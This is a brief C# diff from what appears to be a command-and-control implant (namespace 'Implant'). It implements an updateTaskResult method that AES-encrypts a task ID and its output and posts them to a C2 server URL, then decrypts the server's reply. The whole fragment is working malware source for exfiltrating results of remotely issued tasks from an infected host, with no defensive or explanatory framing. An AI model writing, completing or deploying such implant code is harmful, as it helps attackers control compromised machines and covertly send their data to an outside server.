@@ -71,7 +71,19 @@ namespace Implant
 
         }
 
-        public void updateTaskResult(){}
+        public void updateTaskResult(string UUID, string taskResult){
+            var client = new HttpClient();
+            var body = new Dictionary<string, string>();
+            body.Add("taskId", UUID);
+            body.Add("taskResult", taskResult);
+            string encryptedBody = cryptoProvider.encryptAesMessage(JsonSerializer.Serialize(body));
+            string jsonBody = buildJsonMessage(encryptedBody);
+            var response = client.PostAsync(this.c2Url + "/updateTaskResult", new StringContent(jsonBody, Encoding.UTF8, "application/json")).Result;
+
+            var encryptedString = response.Content.ReadAsStringAsync().Result;
+            var decrypted = cryptoProvider.decryptAesMessage(encryptedString);
+
+        }
 
         private static string Base64Encode(string plainText)
         {
